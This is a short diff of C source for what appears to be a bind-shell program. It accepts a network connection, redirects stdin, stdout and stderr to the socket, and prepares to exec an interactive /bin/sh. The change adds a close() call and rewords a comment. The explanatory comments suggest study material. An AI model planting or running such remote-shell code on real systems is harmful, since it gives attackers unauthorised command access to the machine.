@@ -55,10 +55,11 @@ int main(int ac, char **av)
 		{ perror("accept()"); goto cleanup; }
 
 	// these close the descriptor, not the descriptee
-	// in other words, the virtual terminal
+	// in other words, the pseudo terminal remains open
 	dup2(fd2, STDIN_FILENO); // close 0, make 0 describe socket
 	dup2(fd2, STDOUT_FILENO); // close 1, make 1 describe socket
 	dup2(fd2, STDERR_FILENO); // close 2, make 2 describe socket
+	close(fd2); // socket not closed since still referenced by 0,1,2
 
 	// EXECVE
 	char *const child_argv[3] = {"/bin/sh", "-i", NULL};
